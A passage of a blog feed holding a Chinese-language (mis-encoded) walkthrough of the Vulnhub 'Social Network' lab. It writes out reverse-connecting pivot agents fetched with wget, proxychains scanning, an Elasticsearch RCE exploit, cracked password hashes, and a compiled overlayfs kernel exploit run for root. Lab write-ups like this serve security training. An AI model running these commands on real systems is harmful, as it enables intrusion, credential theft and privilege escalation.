v1.1.0æ–‡ä»¶å¤¹å†…æ‰“å¼€ç»ˆç«¯çª—å£</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./admin_linux_x64 -lport 9999    #å¯åŠ¨æœåŠ¡ç«¯ç¨‹åº å¹¶åœ¨æœ¬åœ°ä¾¦å¬9999ç«¯å£ï¼Œç­‰å¾…å®¢æˆ·ç«¯ï¼ˆç›®æ ‡å®¹å™¨ç³»ç»Ÿï¼‰å’Œkaliå»ºç«‹åå¼¹è¿æ¥</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918110456551.png" alt="image-20210918110456551"></p><p>å¦‚ä½•å°†<strong>agent_linux_x64</strong>æ‹·è´åˆ°<strong>å®¢æˆ·ç«¯</strong>ï¼ˆç›®æ ‡å®¹å™¨ç³»ç»Ÿï¼‰ï¼Ÿ</p><p>åœ¨<strong>Kaliæœ¬åœ°çš„Venomæ–‡ä»¶å¤¹å†…æ‰“å¼€HTTPæœåŠ¡</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918110518309.png" alt="image-20210918110518309"></p><p>å†ä½¿ç”¨<strong>å®¢æˆ·ç«¯</strong>ï¼ˆç›®æ ‡å®¹å™¨ç³»ç»Ÿï¼‰<strong>è®¿é—®Kaliæ¥ä¸‹è½½</strong>agent_linux_x64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.0.2.4/agent_linux_x64</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><p>å¹¶èµ‹äºˆagent_linux_x64å¯æ‰§è¡Œæƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x agent_linux_x64</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918110710067.png" alt="image-20210918110710067"></p><p>å¯åŠ¨å®¢æˆ·ç«¯ç¨‹åºï¼Œä¸Kaliå»ºç«‹è¿æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./agent_linux_x64 -rhost 10.0.2.4 -rport 9999</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918110830474.png" alt="image-20210918110830474"></p><p>æœåŠ¡å™¨ç«¯ä¹Ÿæ¥æ”¶åˆ°äº†å®¢æˆ·ç«¯çš„è¿æ¥è¯·æ±‚</p><h4 id="2-4å»ºç«‹è¿æ¥"><a href="#2-4å»ºç«‹è¿æ¥" class="headerlink" title="2.4å»ºç«‹è¿æ¥"></a>2.4å»ºç«‹è¿æ¥</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show #æ˜¾ç¤ºå·²è¿æ¥æˆåŠŸçš„èŠ‚ç‚¹</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">goto 1 #è¿æ¥å½“å‰è¯¥èŠ‚ç‚¹</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918110902587.png" alt="image-20210918110902587"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks 1080</span><br></pre></td></tr></table></figure><p>å¯åŠ¨socksç›‘å¬1080ç«¯å£ï¼Œå»ºç«‹ä¸€æ¡<strong>ä»£ç†é€šé“</strong>ï¼Œè®©kalièƒ½å¤Ÿé€šè¿‡ä»£ç†å»<strong>æ­£å¸¸è®¿é—®</strong>ç›®æ ‡å®¹å™¨ç³»ç»Ÿ<strong>å†…ç½‘ç½‘æ®µ</strong>ï¼Œæ–¹ä¾¿ä½¿ç”¨kaliä¸Šçš„å„ç±»å·¥å…·</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918111109130.png" alt="image-20210918111109130"></p><p>åˆ©ç”¨proxychains<strong>å»ºç«‹ä»£ç†</strong></p><p>åœ¨Kaliç«¯ ä¿®æ”¹é…ç½®æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/proxychains4.conf </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918111302194.png" alt="image-20210918111302194"></p><p>å¯¹åº”ä¸Šä¸€æ­¥è®¾ç½®çš„socks5ä»£ç†å’Œç«¯å£ï¼Œå°†å…¶ä¿®æ”¹åŒ¹é…</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918111415145.png" alt="image-20210918111415145"></p><p><strong>ä»£ç†é€šé“å»ºç«‹æˆåŠŸ</strong>åå°±å¯ä»¥å¼€å§‹å¯¹å†…ç½‘çš„172.17.0.1å’Œ172.17.0.2è¿›è¡Œæ‰«æ</p><h3 id="3-é’ˆå¯¹å†…ç½‘ä¸»æœºç«¯å£æ‰«æ"><a href="#3-é’ˆå¯¹å†…ç½‘ä¸»æœºç«¯å£æ‰«æ" class="headerlink" title="3.é’ˆå¯¹å†…ç½‘ä¸»æœºç«¯å£æ‰«æ"></a>3.é’ˆå¯¹å†…ç½‘ä¸»æœºç«¯å£æ‰«æ</h3><h4 id="3-1é’ˆå¯¹172-17-0-1æ‰«æ"><a href="#3-1é’ˆå¯¹172-17-0-1æ‰«æ" class="headerlink" title="3.1é’ˆå¯¹172.17.0.1æ‰«æ"></a>3.1é’ˆå¯¹172.17.0.1æ‰«æ</h4><p>å…ˆå¯¹172.17.0.1è¿›è¡Œç«¯å£æ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -Pn -sT 172.17.0.1</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918111604295.png" alt="image-20210918111604295"></p><p>è¿›ä¸€æ­¥æ‰«æç«¯å£æœåŠ¡ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -p22,5000 -sV 172.17.0.1</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918111650164.png" alt="image-20210918111650164"></p><p>å‘ç°ä¹Ÿå¼€æ”¾äº†22å’Œ5000ç«¯å£ï¼Œ<strong>ä¼¼æ›¾ç›¸è¯†</strong>ï¼Œä¸”æœåŠ¡ä¿¡æ¯å¥½åƒä¹Ÿä¸æœ€å¼€å§‹å¯¹é¶æœº10.0.2.5æ‰«æçš„<strong>ç»“æœç›¸åŒ</strong>ã€‚</p><p>é€šè¿‡æµè§ˆå™¨è®¿é—®ä¸€ä¸‹172.17.0.1ï¼Œç»™æµè§ˆå™¨é…ç½®ä»£ç†</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918111815559.png" alt="image-20210918111815559"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è®¿é—®ï¼šhttp://172.17.0.1:5000</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918111845987.png" alt="image-20210918111845987"></p><p>å‘ç°é¡µé¢ä¸ä¹‹å‰è®¿é—®10.0.2.5:5000ç«¯å£çš„é¡µé¢ä¸€è‡´ï¼Œä¸”ä¹‹å‰åœ¨10.0.2.5<strong>æµ‹è¯•çš„ç—•è¿¹</strong>ä¹Ÿ<strong>å®Œå…¨ç›¸åŒ</strong>ä¿ç•™åœ¨è¿™ä¸ªé¡µé¢</p><p>åˆ¤æ–­è¯´æ˜172.17.0.1æ˜¯10.0.2.5é¢å‘å®¹å™¨å†…çš„ä¸»æœº</p><h4 id="3-2é’ˆå¯¹172-17-0-2æ‰«æ"><a href="#3-2é’ˆå¯¹172-17-0-2æ‰«æ" class="headerlink" title="3.2é’ˆå¯¹172.17.0.2æ‰«æ"></a>3.2é’ˆå¯¹172.17.0.2æ‰«æ</h4><p>å†å¯¹172.17.0.2è¿›è¡Œç«¯å£æ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -Pn -sT  172.17.0.2</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918111955790.png" alt="image-20210918111955790"></p><p>ç»“æœä¸º9200ç«¯å£å¼€æ”¾ï¼Œè¿›ä¸€æ­¥æ‰«æç«¯å£æœåŠ¡ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -p9200 -sV 172.17.0.2</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918112034101.png" alt="image-20210918112034101"></p><p>å‘ç°æ˜¯9200ç«¯å£ä¸Šæ˜¯ElasticsearchæœåŠ¡ï¼Œä¸”ç‰ˆæœ¬æ˜¯1.4.2</p><h3 id="4-Elasticsearchæ¼æ´åˆ©ç”¨"><a href="#4-Elasticsearchæ¼æ´åˆ©ç”¨" class="headerlink" title="4.Elasticsearchæ¼æ´åˆ©ç”¨"></a>4.Elasticsearchæ¼æ´åˆ©ç”¨</h3><p>Elasticsearchåœ¨å†å²ç‰ˆæœ¬ä¸Šæ›¾å‡ºç°è¿‡å‡ æ¬¡éªŒè¯æ¼æ´ï¼Œæœ‰<strong>RCEè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</strong>ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬å°è¯•åœ¨kaliä¸Šæœç´¢æœ‰æ²¡æœ‰Elasticsearchç›¸å…³<strong>exp</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Elasticsearch</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918112136386.png" alt="image-20210918112136386"></p><p>å‘ç°ä¸¤ä¸ªRCEè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œæˆ‘ä»¬å…ˆå°è¯•ç¬¬ä¸€ä¸ªã€‚</p><p>å°†è„šæœ¬<strong>æ‹·è´</strong>è‡³å½“å‰ç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/remote/36337.py .</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918112328098.png" alt="image-20210918112328098"></p><p>æŸ¥çœ‹è„šæœ¬ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi 36337.py</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918112617712.png" alt="image-20210918112617712"></p><p>ç®€å•æŸ¥çœ‹è¯¥è„šæœ¬åå‘ç°è¯¥è„šæœ¬ä½¿ç”¨<strong>python2</strong>ç¼–å†™çš„ã€‚ï¼ˆè®¤çœŸçœ‹ä¹Ÿçœ‹ä¸æ‡‚-.-ï¼‰</p><p>æ‰§è¡Œè„šæœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python2 36337.py 172.17.0.2</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šè¿™é‡Œå¯èƒ½ä¼šå‡ºç°æ‰§è¡Œå¤±è´¥çš„å¯èƒ½ï¼Œåªéœ€è¦æ’å…¥ä¸€æ¡æ•°æ®åï¼Œå³å¯æˆåŠŸæ‰§è¡Œï¼Œè‹¥å¤±è´¥å¯å‚è€ƒé“¾æ¥<a href="http://www.hackdig.com/05/hack-88907.htm">http://www.hackdig.com/05/hack-88907.htm</a></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918113310676.png" alt="image-20210918113310676"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure><p>æˆåŠŸ<strong>è·å–</strong>åˆ°è¯¥å®¹å™¨ç³»ç»Ÿçš„<strong>rootæƒé™</strong></p><h3 id="5-è·å–rootæƒé™åçš„å‘ç°"><a href="#5-è·å–rootæƒé™åçš„å‘ç°" class="headerlink" title="5.è·å–rootæƒé™åçš„å‘ç°"></a>5.è·å–rootæƒé™åçš„å‘ç°</h3><h4 id="5-1å‘ç°å¯†ç æ–‡ä»¶"><a href="#5-1å‘ç°å¯†ç æ–‡ä»¶" class="headerlink" title="5.1å‘ç°å¯†ç æ–‡ä»¶"></a>5.1å‘ç°å¯†ç æ–‡ä»¶</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918113616491.png" alt="image-20210918113616491"></p><p>å‘ç°passwordsæ–‡ä»¶ï¼Œæ˜¯å¦å¯èƒ½å­˜åœ¨å¯†ç ï¼Ÿ</p><p>æŸ¥çœ‹passwordsæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat passwords</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918113740971.png" alt="image-20210918113740971"></p><p>å‘ç°çš„ç¡®æ˜¯<strong>å­˜æ”¾è´¦å·å¯†ç </strong>çš„æ–‡ä»¶</p><p>john:3f8184a7343664553fcb5337a3138814<br>test:861f194e9d6118f3d942a72be3e51749<br>admin:670c3bbc209a18dde5446e5e6c1f1d5b<br>root:b3d34352fc26117979deabdf1b9b6354<br>jane:5c158b60ed97c723b673529b8a3cf72b</p><p>ä½†å¯†ç è¢«åŠ å¯†ï¼Œå°è¯•ç ´è§£</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918114022331.png" alt="image-20210918114022331"></p><p>æœ€ç»ˆç ´è§£å¾—åˆ°çš„<strong>æ˜æ–‡å¯†ç </strong>å¦‚ä¸‹ï¼š</p><p>john:1337hack<br>test:1234test<br>admin:1111pass<br>root:1234pass<br>jane:1234jane</p><h4 id="5-2å¯†ç åˆ©ç”¨"><a href="#5-2å¯†ç åˆ©ç”¨" class="headerlink" title="5.2å¯†ç åˆ©ç”¨"></a>5.2å¯†ç åˆ©ç”¨</h4><p>é‚£ä¹ˆè¯¥å¦‚ä½•åˆ©ç”¨è¿™äº›è´¦å·å¯†ç å‘¢ï¼Ÿå¯»æ‰¾å¼€æ”¾äº†22ç«¯å£çš„IPåœ°å€ï¼ˆ10.0.2.5ï¼‰ä½¿ç”¨<strong>sshè¿æ¥</strong></p><p>æœ€ç»ˆå‘ç°åªæœ‰johnæ˜¯å¯ä»¥æˆåŠŸç™»é™†åˆ©ç”¨çš„è´¦å·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh john@10.0.2.5</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918114835254.png" alt="image-20210918114835254"></p><p>æˆåŠŸç™»é™†ï¼ŒæŸ¥çœ‹å½“å‰ç”¨æˆ·æƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918114914900.png" alt="image-20210918114914900"></p><p>å½“å‰ä¸ºæ™®é€šç”¨æˆ·</p><h4 id="5-3æ¼æ´å‘ç°"><a href="#5-3æ¼æ´å‘ç°" class="headerlink" title="5.3æ¼æ´å‘ç°"></a>5.3æ¼æ´å‘ç°</h4><p>å°è¯•æœ‰æ²¡æœ‰<strong>sudoææƒæ¼æ´</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æœ¬åœ°ææƒï¼Œç»“åˆä¹‹å‰å¾—åˆ°çš„ä¿¡æ¯è¯¥é¶æœº<strong>å†…æ ¸Linux 3.13</strong>ï¼Œé‚£ä¹ˆè¿™æ ·çš„è€ç‰ˆæœ¬æ˜¯å¦å¯èƒ½å­˜åœ¨<strong>å†…æ ¸æ¼æ´</strong>ï¼Ÿ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit linux 3.13</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918115843764.png" alt="image-20210918115843764"></p><p>é€‰å–ä¸€ä¸ªexp</p><p>æ‹·è´åˆ°æœ¬åœ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/local/37292.c .</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918115933320.png" alt="image-20210918115933320"></p><p>æŸ¥çœ‹æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi 37292.c</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918120006327.png" alt="image-20210918120006327"></p><p>ä»ä»£ç ä¸­å¯ä»¥çœ‹åˆ°ï¼Œè¦æ‰§è¡Œå®ƒçš„è¯ï¼Œå…ˆè¦ç”¨<strong>gccç¼–è¯‘å</strong>æ‰å¯æ‰§è¡Œ</p><p>åœ¨é¶æœºç«¯<strong>æŸ¥çœ‹æ˜¯å¦å­˜åœ¨gcc</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918115700764.png" alt="image-20210918115700764"></p><p>æ²¡æœ‰gcc</p><p>æ‰€ä»¥æ˜¯å¦å¯ä»¥åœ¨Kaliæœ¬æœºä¸Š<strong>å…ˆå¯¹å…¶è¿›è¡Œç¼–è¯‘</strong></p><p>åˆ†æä»£ç </p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918120844859.png" alt="image-20210918120844859"></p><p>å®šä¹‰äº†å˜é‡libï¼Œå˜é‡è°ƒç”¨systemå‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå‘½ä»¤ä¸­å†æ¬¡<strong>è°ƒç”¨äº†gcc</strong>ï¼Œå»æŸ¥æ‰¾åˆ°å¦å¤–ä¸€ä¸ªCè¯­è¨€åº“æ–‡ä»¶ofs-lib.cï¼ŒæŠŠè¯¥åº“æ–‡ä»¶å†<strong>ç¼–è¯‘æˆ</strong>å¯¹åº”çš„<strong>ofs-lib.so</strong>æ–‡ä»¶ï¼ˆäºŒè¿›åˆ¶å…±äº«åº“æ–‡ä»¶ï¼‰ï¼Œ<strong>ä¸”åœ¨æ•´ä¸ªä»£ç è¿‡ç¨‹ä¸­ï¼Œä¼šåŠ è½½è°ƒç”¨ç¼–è¯‘åçš„ofs-lib.so.soæ–‡ä»¶</strong></p><p>å¾—åˆ°ï¼šå³ä½¿åœ¨Kaliç«¯ä½¿ç”¨gccç¼–è¯‘è¯¥æ–‡ä»¶ï¼Œä¸Šä¼ åˆ°ç›®æ ‡é¶æœºä¸Šæ‰§è¡Œæ—¶ï¼Œæ‰§è¡Œè¿‡ç¨‹ä»ç„¶ä¼šè°ƒç”¨gccç¼–è¯‘åçš„<strong>ofs-lib.so.so</strong>æ–‡ä»¶ï¼Œ<strong>ä»ç„¶ä¼šæŠ¥é”™</strong>ã€‚</p><p>è§£å†³åŠæ³•ï¼šä¿®æ”¹æºä»£ç ï¼Œ<strong>åˆ é™¤è°ƒç”¨åº“æ–‡ä»¶çš„ä»£ç </strong></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918121534221.png" alt="image-20210918121534221"></p><p>æœ€ç»ˆä»£ç å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918121641513.png" alt="image-20210918121641513"></p><h4 id="5-4æ¼æ´åˆ©ç”¨"><a href="#5-4æ¼æ´åˆ©ç”¨" class="headerlink" title="5.4æ¼æ´åˆ©ç”¨"></a>5.4æ¼æ´åˆ©ç”¨</h4><p>gccç¼–è¯‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o exp 37292.c</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918121714255.png" alt="image-20210918121714255"></p><p>ç¼–è¯‘è¿‡ç¨‹ä¸­æŠ¥é”™ï¼Œä½†<strong>ä¸å½±å“æœ€ç»ˆæ‰§è¡Œç»“æœ</strong></p><p>æŸ¥çœ‹ç¼–è¯‘ç”Ÿæˆçš„exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918121816991.png" alt="image-20210918121816991"></p><p>é…åˆexpæ‰§è¡Œä½¿ç”¨è¿˜éœ€è¦äºŒè¿›åˆ¶çš„åº“æ–‡ä»¶<strong>ofs-lib.so</strong>ï¼Œå®šä½æŸ¥æ‰¾è¯¥æ–‡ä»¶è·¯å¾„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">locate ofs-lib.so</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918122041377.png" alt="image-20210918122041377"></p><p>æ‹·è´è‡³å½“å‰ç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/metasploit-framework/data/exploits/CVE-2015-1328/ofs-lib.so .</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918122314167.png" alt="image-20210918122314167"></p><p>ä¸¤ä¸ªæ–‡ä»¶éƒ½åœ¨å½“å‰ç›®å½•ä¸‹</p><p>å‡†å¤‡å°†å…¶ä¸€å¹¶è¢«ä¸‹è½½åˆ°ç›®æ ‡å®¿ä¸»æœºä¸Šï¼Œå¯åŠ¨httpæœåŠ¡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918122427173.png" alt="image-20210918122427173"></p><p>ä¸‹è½½æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.0.2.4/exp</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.0.2.4/ofs-lib.so</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918122710747.png" alt="image-20210918122710747"></p><p>æ‹·è´åˆ°ç›®æ ‡é¶æœºçš„&#x2F;tmpç›®å½•ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv * /tmp</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918122819165.png" alt="image-20210918122819165"></p><p>èµ‹äºˆexpæ‰§è¡Œæƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x exp</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œè„šæœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./exp</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918123014190.png" alt="image-20210918123014190"></p><p>æˆåŠŸè·å–ç›®æ ‡rootæƒé™</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Name:&lt;/strong&gt; BoredHackerBlog: Social Network&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Date release:&lt;/strong&gt; 29 Mar 2020&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Author&lt;/strong&gt;: &lt;a href=&quot;https://www.vulnhub.com/author/boredhackerblog,683/&quot;&gt;BoredHackerBlog&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Series&lt;/strong&gt;: &lt;a href=&quot;https://www.vulnhub.com/series/boredhackerblog,295/&quot;&gt;BoredHackerBlog&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Downloadï¼š&lt;/strong&gt;&lt;a href=&quot;https://www.notion.so/01-1369b9060f3143efa7d241a715127a8c&quot;&gt;https://www.vulnhub.com/entry/boredhackerblog-social-network,454/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Description:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Leave a message is a new anonymous social networking site where users can post messages for each other. Theyâ€™ve assigned you to test their set up. They do utilize docker containers. You can conduct attacks against those too. Try to see if you can get root on the host though.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Difficulty:&lt;/strong&gt; Med&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Tasks involved:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;port scanning&lt;/li&gt;
&lt;li&gt;webapp attacks&lt;/li&gt;
&lt;li&gt;code injection&lt;/li&gt;
&lt;li&gt;pivoting&lt;/li&gt;
&lt;li&gt;exploitation&lt;/li&gt;
&lt;li&gt;password cracking&lt;/li&gt;
&lt;li&gt;brute forcing&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Virtual Machine:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Format: Virtual Machine (Virtualbox OVA)&lt;/li&gt;
&lt;li&gt;Operating System: Linux&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Networking:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DHCP Service: Enabled&lt;/li&gt;
&lt;li&gt;IP Address Automatically assign&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This works better with VirtualBox rather than VMware.&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Multipasså®‰è£…ä¸ä½¿ç”¨</title>
    <link href="http://example.com/2022/04/12/Multipass/"/>
    <id>http://example.com/2022/04/12/Multipass/</id>
    <published>2022-04-12T07:09:45.172Z</published>
    <updated>2022-04-12T07:10:14.027Z</updated>
    
